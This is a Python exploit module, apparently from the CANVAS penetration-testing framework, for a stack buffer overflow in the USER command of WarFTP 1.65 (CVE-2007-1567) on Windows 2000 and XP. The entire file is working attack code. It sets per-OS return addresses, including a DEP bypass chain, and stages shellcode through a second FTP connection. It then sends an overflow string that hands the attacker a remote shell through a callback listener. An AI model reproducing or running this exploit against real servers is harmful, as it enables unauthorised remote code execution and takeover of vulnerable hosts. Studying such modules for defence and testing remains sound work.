#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import addencoder
import win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator


NAME="warftp_165"
DESCRIPTION="WarFTP 1.65 Stack Overflow on USER command"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="WarFTP.org"
DOCUMENTATION["Repeatability"]="This exploit is repeatable..."
DOCUMENTATION["URL"]="http://www.securitynull.com/advisories/secnull-11-14-2005-0x2.txt"
DOCUMENTATION["CVE Name"] = "CVE-2007-1567"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1567"
DOCUMENTATION['CVSS'] = 10.0

VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "XP" ]

NOTES="""
Tested on Windows 2000 SP2-SP4 (English/Spanish)
"""

CHANGELOG="""

"""


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

    

    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=21
        self.host=""
        self.shellcode=""
        #hmm, according to 60074207 we only compare with 0, 0d 0a 3f 26 20
        self.badstring="\x00/\\\r\n@"
        self.setVersions()
        self.version=1
        self.searchbadstring = self.badstring
        self.name=NAME
        self.USEMSGPEEK=0
        return

    def setVersions(self):
        self.versions={}
        #name, jmp esi, shellcode
        self.versions[0]=("Autoversion (N/A)" , 0x0) 
        self.versions[1]=("WarFTPD on Windows 2000 SP0-4 & Windows XP SP0-1" , 0x5f4ca93b) # jmp esp of MFC42 
        self.versions[2]=("WarFTPD on Windows XP SP2 (DEP)" , 0x775df857, 0x7c91d3f8, 0x77559b9c) 

    def neededListenerTypes(self):
        if self.USEMSGPEEK:
            return []
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        if self.callback:
            host=self.callback.ip
            port=self.callback.port
        self.createWin32SearchShellcode( host, port)

        return self.shellcode
    
    def test(self):
        """
        
        """
        return self.bannerchecktest({"WAR-FTPD 1.65": 1})
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            self.log("Automatic versioning enabled.")
            self.test()
            if self.version==0:
                self.log("Could not find version!")
                return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        try:
            #we're a bit over generous with this try:accept
            
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))
        
            # s2: allocate the shellcode
            s2=self.gettcpsock()
            s2.connect((self.host, self.port))
            data=s2.recv(1000)
            s2.sendall("USER toca\r\n")
            s2.recv(1000)
            s2.sendall("SITE COCACOCA" +  self.shellcode +  "\r\n")
 
            # overflow and send search shellcode
            data=s.recv(1000)
            self.log("Recieved banner: %s"%prettyprint(data))
            s.set_timeout(20)
            s.sendall( self.makesploit() )

            data=s.recv(1000)
            self.log("Recieved %s"%prettyprint(data))
            s.close()

            
        except:
            #import traceback
            #traceback.print_exc(file=sys.stdout)
            self.log("Attack reported no open socket - service died?")
            #self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME,self.host,self.port))

        time.sleep(5)
        ret=self.ISucceeded()

        if ret:
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return ret
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0

    def makesploit(self):
        """
        Construct the attack
        """
        ver = self.versions[self.version] 
        
        self.log("Size of shellcode: 0x%x" % len(self.shellcode) )

        if  self.version == 1:
            stack = intel_order( ver[1] ) + "AAAA" + self.encodedsearchcode
        elif self.version == 2:
            info, addy1, addy2, addy3 = ver
            stack = intel_order(0x775df857) + "\xff\xff\xff\xff" + intel_order( 0x7c91d3f8 ) + "\xff\xff\xff\xff" + "A" * 0x54 + intel_order(0x77559b9c) + "ABAB"*2 + self.encodedsearchcode
            self.log("Attacking version %s" % info) 
          
        sploitstring = "USER " + "B" * 0x1e5 + stack + "\r\n"
        return sploitstring



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

